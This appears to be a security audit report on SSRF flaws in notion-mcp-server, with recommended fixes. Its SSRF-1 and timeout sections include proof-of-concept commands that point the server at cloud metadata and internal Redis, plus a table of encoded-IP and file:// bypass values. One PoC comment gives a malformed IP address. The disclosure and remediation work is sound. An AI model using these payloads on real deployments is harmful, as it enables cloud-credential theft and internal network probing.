# Audit Report: SSRF Analysis
## notion-mcp-server v2.3.0 — Phase 4

**Scope:** All outbound HTTP requests, URL construction, redirect handling, and timeout behavior
**Analyst:** White-box static analysis
**Date:** 2026-03-30

---

## Executive Summary

The server has **two outbound HTTP call sites** and **one confirmed SSRF vector** (SSRF-1) via the `BASE_URL` environment variable. A secondary potential SSRF exists via user-controlled URL fields forwarded to the Notion API. There is no request timeout anywhere in the HTTP client, creating a denial-of-service amplification condition. The `follow-redirects` library keeps the `Authorization` header on same-host and subdomain redirects (up to 21 hops), enabling credential forwarding to attacker-controlled subdomains in misconfigured environments.

---

## Outbound HTTP Call Sites

### Call Site 1 — Startup Health Check (Hardcoded URL)

**File:** `scripts/start-server.ts`, lines 246–264

```typescript
const response = await fetch('https://api.notion.com/v1/users/me', {
  headers: {
    Authorization: `Bearer ${notionToken}`,
    'Notion-Version': '2022-06-28',
  },
})
```

- URL is **hardcoded** to `https://api.notion.com`
- Not controllable by user input
- Not a SSRF vector

---

### Call Site 2 — Per-Tool HTTP Dispatch via Axios (SSRF Vector)

**File:** `src/openapi-mcp-server/client/http-client.ts`, lines 36–50 and 147–168

```typescript
// Constructor — builds Axios client with baseURL from OpenAPI spec
constructor(config: HttpClientConfig, spec: OpenAPIV3.Document) {
  const axiosConfigDefaults: AxiosRequestConfig = {
    baseURL: config.baseUrl,  // line 37 — sourced from spec's servers[0].url
    headers: {
      Authorization: config.headers?.Authorization ?? '',  // baked-in token
      'Notion-Version': config.headers?.['Notion-Version'] ?? '',
      'Content-Type': 'application/json',
      'User-Agent': 'notion-mcp-server/1.0',
    },
  }
  this.api = new OpenAPIClientAxios({ definition: spec, axiosConfigDefaults }).init()
}

// executeOperation — dispatches by operationId
const api = await this.api
const operationFn = (api as any)[operationId]  // line 147
const axiosResponse = await operationFn(pathAndQueryParams, bodyParams, axiosConfig)
```

The `baseURL` value flows from:
```
BASE_URL env var
  → init-server.ts:32  (parsed.servers[0].url = baseUrl)
  → proxy.ts:95        (new HttpClient({ baseUrl: spec.servers[0].url }, spec))
  → http-client.ts:37  (axiosConfigDefaults.baseURL = config.baseUrl)
  → every Axios request
```

---

## SSRF-1 — Unvalidated BASE_URL Environment Variable (CONFIRMED)

### Severity: HIGH

### Attack Description

The `BASE_URL` environment variable replaces the OpenAPI spec's server URL with **no validation**:

**File:** `src/init-server.ts`, lines 28–35

```typescript
export async function initServer(specPath: string, baseUrl?: string) {
  const specContent = fs.readFileSync(path.resolve(process.cwd(), specPath), 'utf-8')
  const parsed = JSON.parse(specContent)  // line 29

  if (baseUrl) {
    parsed.servers[0].url = baseUrl  // line 32 — NO validation, NO allowlist
  }
  // ...
}
```

**File:** `scripts/start-server.ts`, line 18

```typescript
const baseUrl = process.env.BASE_URL ?? undefined  // no validation
```

### What Is Accepted

There is **no scheme allowlist, no hostname blocklist, and no URL parsing** applied to `BASE_URL`. All of the following are accepted:

| Value | Effect |
|-------|--------|
| `http://169.254.169.254` | AWS EC2 IMDS — leaks IAM credentials |
| `http://169.254.169.254/latest/meta-data/` | Direct IMDS path |
| `http://192.168.0.1` | Internal RFC1918 network scan |
| `http://0.0.0.0:6379` | Redis on localhost (RESP injection) |
| `http://[::1]:5432` | IPv6 localhost → PostgreSQL |
| `http://0251.0376.0251.0376` | Octal IP = 169.254.169.254 |
| `http://2852039166` | Decimal IP = 169.254.169.254 |
| `file:///etc/passwd` | Local file read (Axios behavior-dependent) |

### Attack Path (Step by Step)

1. Attacker controls the environment where `notion-mcp-server` runs (e.g., compromised Docker host, CI pipeline, or self-hosted deployment)
2. Sets `BASE_URL=http://169.254.169.254`
3. Starts the server: `BASE_URL=http://169.254.169.254 npx @notionhq/notion-mcp-server`
4. `init-server.ts:32` sets `parsed.servers[0].url = 'http://169.254.169.254'`
5. `HttpClient` constructed with `baseURL: 'http://169.254.169.254'` and headers:
   ```
   Authorization: Bearer <NOTION_TOKEN>
   Notion-Version: 2022-06-28
   ```
6. Any MCP tool call (e.g., `notion_list_databases`) triggers:
   ```
   GET http://169.254.169.254/v1/databases
   Authorization: Bearer <NOTION_TOKEN>
   ```
7. IMDS returns AWS credential JSON (or equivalent cloud metadata)
8. Server returns IMDS response to MCP client as tool output

### Proof of Concept

```bash
# Start server pointed at AWS IMDS
BASE_URL=http://169.254.169.254 \
NOTION_TOKEN=secret_placeholder \
npx @notionhq/notion-mcp-server

# In the MCP client, call any tool:
# {"method": "tools/call", "params": {"name": "notion_list_databases", "arguments": {}}}
# Server issues: GET http://169.254.269.254/v1/databases
# Response contains cloud metadata or IAM credentials
```

**SSRF to internal port scan:**

```bash
# Scan internal Redis
BASE_URL=http://127.0.0.1:6379 NOTION_TOKEN=x npx @notionhq/notion-mcp-server

# Call any tool → GET http://127.0.0.1:6379/v1/databases
# Axios receives TCP data from Redis RESP protocol
# Error response reveals port is open/closed and leaks protocol banner
```

### Root Cause

`src/init-server.ts:32` — direct string assignment with no validation:
```typescript
parsed.servers[0].url = baseUrl  // UNSAFE: accepts any URL
```

### Recommended Fix

```typescript
import { URL } from 'url'

const ALLOWED_SCHEMES = ['https:']
const ALLOWED_HOSTS = ['api.notion.com']

if (baseUrl) {
  const parsed_url = new URL(baseUrl)
  if (!ALLOWED_SCHEMES.includes(parsed_url.protocol)) {
    throw new Error(`BASE_URL scheme '${parsed_url.protocol}' not allowed; must be https:`)
  }
  if (!ALLOWED_HOSTS.includes(parsed_url.hostname)) {
    throw new Error(`BASE_URL host '${parsed_url.hostname}' not in allowlist`)
  }
  parsed.servers[0].url = baseUrl
}
```

---

## SSRF-2 — Absolute URL Bypass via Axios (NEEDS VERIFICATION)

### Severity: MEDIUM

### Description

Axios skips `baseURL` when `config.url` is already an absolute URL. The `openapi-client-axios` library constructs the request URL by combining `baseURL` + operation path. However, if an attacker can inject an absolute URL into the path segment, Axios would route the request to that URL instead of `baseURL`.

**Axios source (`axios/lib/core/buildFullPath.js`):**
```javascript
module.exports = function buildFullPath(baseURL, requestedURL) {
  if (baseURL && !isAbsoluteURL(requestedURL)) {
    return combineURLs(baseURL, requestedURL)  // normal case
  }
  return requestedURL  // absolute URL bypasses baseURL entirely
}
```

**Potential injection points:**

Path parameters are protected by `encodeURIComponent` in `bath-es5`:
```javascript
return a.split('{' + name + '}').join(encodeURIComponent(params[name]))
```
`http://attacker.com` becomes `http%3A%2F%2Fattacker.com` — safe.

However, `openapi-client-axios` also constructs the path string. If an operation's `path` property (from the OpenAPI spec itself) were attacker-controlled, it could inject an absolute URL. In the current codebase, the spec is loaded from disk (`scripts/notion-openapi.json`) and `BASE_URL` only overrides `servers[0].url`, not individual paths — so this path requires `BASE_URL` control or spec file replacement.

**NEEDS VERIFICATION** — requires dynamic testing to confirm whether `openapi-client-axios` v7.6.0 passes the path through `buildFullPath` or constructs it differently.

---

## SSRF-3 — User-Controlled URL Fields Forwarded to Notion API (INFORMATIONAL)

### Severity: LOW (requires Notion API to be SSRF-vulnerable)

### Description

Several Notion API request body fields accept arbitrary URLs from MCP tool input and forward them directly to the Notion API with **no validation**:

**File:** `scripts/notion-openapi.json` — fields with `format: uri` or `uri-reference`

1. **`cover.external.url`** — page cover image URL
   ```json
   "external": {
     "type": "object",
     "properties": {
       "url": { "type": "string" }
     }
   }
   ```
   Sent in `PATCH /v1/pages/{page_id}` request body.

2. **`richText.text.link.url`** — rich text hyperlink URL
   ```json
   "link": {
     "type": "object",
     "properties": {
       "url": { "type": "string" }
     }
   }
   ```
   Sent in any operation that accepts rich text (create/update page, append block).

These URLs are forwarded by this server to the Notion API without validation. Whether Notion's backend fetches these URLs (making Notion itself SSRF-vulnerable) is outside this server's scope but noted for completeness.

---

## Redirect Handling Analysis

### Library: `follow-redirects` v1.15.11

Axios uses `follow-redirects` for redirect handling. The Authorization header stripping logic:

**File:** `node_modules/follow-redirects/index.js`, lines 469–475

```javascript
if (redirectUrl.protocol !== currentUrlParts.protocol &&
   redirectUrl.protocol !== "https:" ||
   redirectUrl.host !== currentHost &&
   !isSubdomain(redirectUrl.host, currentHost)) {
  removeMatchingHeaders(/^(?:(?:proxy-)?authorization|cookie)$/i, this._options.headers);
}
```

**Behavior:**

| Redirect Destination | Authorization Kept? |
|---------------------|---------------------|
| Same host, same protocol | **YES** |
| Subdomain of same host | **YES** |
| Different host, same protocol | NO (stripped) |
| HTTP → HTTPS | NO (stripped) |
| HTTPS → HTTP (downgrade) | NO (stripped) |

**Default `maxRedirects: 21`** — 21 redirect hops followed by default.

### SSRF-4 — Credential Forwarding via Same-Host Redirect Chain (NEEDS VERIFICATION)

**Severity: LOW** (requires specific deployment conditions)

If the Notion API (or a host reachable at `BASE_URL`) returns a redirect to a subdomain (e.g., `302 Location: http://internal.api.notion.com/...`), the `Authorization: Bearer <NOTION_TOKEN>` header **will be forwarded** to that subdomain. With a misconfigured `BASE_URL` pointing at an attacker-controlled host, the attacker can redirect the client through up to 21 hops, each receiving the Notion token.

**NEEDS VERIFICATION** — requires a live endpoint to confirm redirect behavior.

---

## No Request Timeout (DoS Amplification)

### Severity: MEDIUM (prerequisite: network access or BASE_URL control)

**File:** `src/openapi-mcp-server/client/http-client.ts`, lines 36–50

```typescript
const axiosConfigDefaults: AxiosRequestConfig = {
  baseURL: config.baseUrl,
  headers: { ... },
  // NO timeout field
}
```

**Axios default** (`axios/lib/defaults/index.js`):
```javascript
timeout: 0  // 0 = no timeout (unlimited wait)
```

**Impact:** If `BASE_URL` points to a slow or non-responding server (including `http://169.254.169.254` with filtered IMDS), each tool call hangs indefinitely. This ties up an MCP session and, in a multi-tenant deployment, exhausts connection pool threads.

**PoC:**
```bash
# Point at a TCP black-hole
BASE_URL=http://10.255.255.255 NOTION_TOKEN=x npx @notionhq/notion-mcp-server
# Call any tool → request hangs forever
# MCP client connection held open indefinitely
```

**Recommended Fix:** Add timeout to `axiosConfigDefaults`:
```typescript
const axiosConfigDefaults: AxiosRequestConfig = {
  baseURL: config.baseUrl,
  timeout: 30000,  // 30 seconds
  headers: { ... },
}
```

---

## Findings Summary

| ID | Title | Severity | Confirmed |
|----|-------|----------|-----------|
| SSRF-1 | Unvalidated `BASE_URL` → full SSRF to any host with auth token forwarding | HIGH | YES |
| SSRF-2 | Axios absolute URL bypass via `buildFullPath` | MEDIUM | NEEDS VERIFICATION |
| SSRF-3 | User-controlled URL fields forwarded to Notion API | LOW | YES (server-side) |
| SSRF-4 | Authorization header kept on subdomain redirects (21-hop chain) | LOW | NEEDS VERIFICATION |
| DOS-2 | No request timeout → indefinite hang per tool call | MEDIUM | YES |

---

## Interaction with Previously Found Vulnerabilities

- **AUTH-3 (token in command line)** + **SSRF-1**: An attacker who can read `/proc/<pid>/cmdline` gets `--auth-token`, then can call MCP tools to trigger SSRF via a previously-set `BASE_URL`.
- **INJ-1 (deserializeParams stack overflow)** + **SSRF-1**: Both are denial-of-service amplified by the lack of timeout on the outbound HTTP request — a hung SSRF request and a stack overflow compound to exhaust server resources.
- **AUTH-5 (OPENAPI_MCP_HEADERS injection)**: `OPENAPI_MCP_HEADERS` can inject arbitrary headers (e.g., `Host:`, `X-Forwarded-For:`) into the Axios request, potentially bypassing IP-based SSRF filters on internal services.

---

## Appendix: Key Code References

| File | Lines | Description |
|------|-------|-------------|
| `scripts/start-server.ts` | 18 | `BASE_URL` read from env, no validation |
| `src/init-server.ts` | 30–33 | `BASE_URL` written to spec, no validation |
| `src/openapi-mcp-server/mcp/proxy.ts` | 95 | `HttpClient` constructed with spec's baseUrl |
| `src/openapi-mcp-server/client/http-client.ts` | 36–50 | Axios defaults (no timeout, baked-in auth headers) |
| `node_modules/follow-redirects/index.js` | 469–475 | Authorization stripping condition |
| `node_modules/axios/lib/core/buildFullPath.js` | 1–6 | Absolute URL bypass logic |
| `node_modules/axios/lib/defaults/index.js` | ~60 | `timeout: 0` default |
